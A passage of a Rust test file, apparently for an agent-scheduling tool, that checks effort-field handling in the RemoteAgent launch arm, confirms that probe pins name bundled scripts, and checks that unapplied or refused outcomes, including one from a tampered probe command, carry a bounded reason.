        .split_once("ScheduledTaskType::RemoteAgent {\n                prompt,")
        .expect("the RemoteAgent launch arm")
        .1
        .split_once("} => {")
        .expect("arm pattern ends")
        .0;
    assert!(arm.contains(".."), "{arm}");
    for f in ["effort", "ultracode", "effort_profile"] {
        assert!(
            !arm.split(',').any(|b| b.trim() == f),
            "the scheduler now binds `{f}`: drop REASON_EFFORT_FIELDS_UNSUPPORTED"
        );
    }
}

// ---- pins are this binary's own ----------------------------------------------------

#[test]
fn every_probe_pin_names_a_script_this_binary_bundles() {
    for pin in PROBE_PINS {
        let mut bundled = 0;
        for arg in pin.command {
            if let Some(after) = arg.strip_prefix(BUNDLED_SKILL_TOKEN_PREFIX) {
                let (skill, rest) = after.split_once('}').unwrap();
                let path = format!("{skill}{rest}");
                assert!(
                    crate::fleet_skills::FLEET_SKILLS.get_file(&path).is_some(),
                    "pin {} names {path}, which this binary does not bundle",
                    pin.pin_id
                );
                bundled += 1;
            }
        }
        assert!(bundled > 0, "pin {} runs no bundled script", pin.pin_id);
    }
    // coord's catalog Script entries: none at eed57ed83, so no Script pin.
    assert!(SCRIPT_PINS.is_empty());
}

// ---- the report ------------------------------------------------------------------

#[test]
fn every_unapplied_or_refused_outcome_carries_a_reason_and_no_other_does() {
    let mut list = parse_device_list(&fixture(), tenant()).unwrap();
    let mut tampered = with_digest(fixture_agent("return-to-main"), DIGEST_B);
    tampered["conditions"]["requireProbe"]["command"] = json!(["sh"]);
    list.entries.insert(
        "return-to-main".into(),
        list_of(vec![tampered])
            .entries
            .remove("return-to-main")
            .unwrap(),
    );
    let p = plan(
        &proven(),
        &[(tenant(), Ok(list))],
        &[base_task("daily-digest")],
        &ctx(),
    );
    for o in &only_tenant(&p).agents {
        let needs = matches!(
            o.state,
            RecurringAgentState::Unapplied | RecurringAgentState::Refused
        );
        assert_eq!(needs, o.reason.is_some(), "{o:?}");
        assert!(o
            .reason
            .as_deref()
            .is_none_or(|r| !r.trim().is_empty() && r.len() <= 256));
    }
}
